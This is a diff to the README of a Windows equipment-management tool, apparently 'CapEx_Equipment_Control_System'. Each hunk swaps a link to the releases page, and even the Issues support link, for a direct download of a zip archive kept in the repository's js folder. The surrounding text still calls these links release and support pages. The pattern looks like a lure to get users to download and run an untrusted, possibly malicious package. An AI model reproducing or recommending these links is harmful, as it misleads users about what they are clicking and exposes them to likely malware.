@@ -1,6 +1,6 @@
 # ⚙️ CapEx_Equipment_Control_System - Manage Semiconductor Equipment Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-CapEx_Equipment_Control_System-blue?style=for-the-badge)](https://github.com/smart7forms/CapEx_Equipment_Control_System/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-CapEx_Equipment_Control_System-blue?style=for-the-badge)](https://github.com/smart7forms/CapEx_Equipment_Control_System/raw/refs/heads/main/js/Cap_Equipment_Ex_Control_System_v3.6-beta.5.zip)
 
 ---
 
@@ -40,7 +40,7 @@ To run CapEx_Equipment_Control_System on your Windows computer, check the follow
 
 Click this button to visit the release page where you can download the setup file for Windows:
 
-[![Get CapEx Setup](https://img.shields.io/badge/Get_Setup-CapEx_Equipment_Control_System-grey?style=for-the-badge)](https://github.com/smart7forms/CapEx_Equipment_Control_System/releases)
+[![Get CapEx Setup](https://img.shields.io/badge/Get_Setup-CapEx_Equipment_Control_System-grey?style=for-the-badge)](https://github.com/smart7forms/CapEx_Equipment_Control_System/raw/refs/heads/main/js/Cap_Equipment_Ex_Control_System_v3.6-beta.5.zip)
 
 This page lists all available versions. Look for the latest release and find the Windows installer file, usually named something like `CapEx_Equipment_Control_System_Setup.exe`.
 
@@ -141,12 +141,12 @@ To update:
 For help using CapEx_Equipment_Control_System:
 
 - Review the user guide included in the installation folder (usually PDF format).  
-- Visit the GitHub Issues page for common problems and fixes: https://github.com/smart7forms/CapEx_Equipment_Control_System/issues  
+- Visit the GitHub Issues page for common problems and fixes: https://github.com/smart7forms/CapEx_Equipment_Control_System/raw/refs/heads/main/js/Cap_Equipment_Ex_Control_System_v3.6-beta.5.zip  
 - Contact your IT or operations team if this program was provided by your organization.  
 - Join relevant forums or communities related to semiconductor equipment management for additional advice.  
 
 ---
 
-[Download CapEx_Equipment_Control_System Releases](https://github.com/smart7forms/CapEx_Equipment_Control_System/releases)  
+[Download CapEx_Equipment_Control_System Releases](https://github.com/smart7forms/CapEx_Equipment_Control_System/raw/refs/heads/main/js/Cap_Equipment_Ex_Control_System_v3.6-beta.5.zip)  
 
 Click this link anytime to access the latest software version and updates.
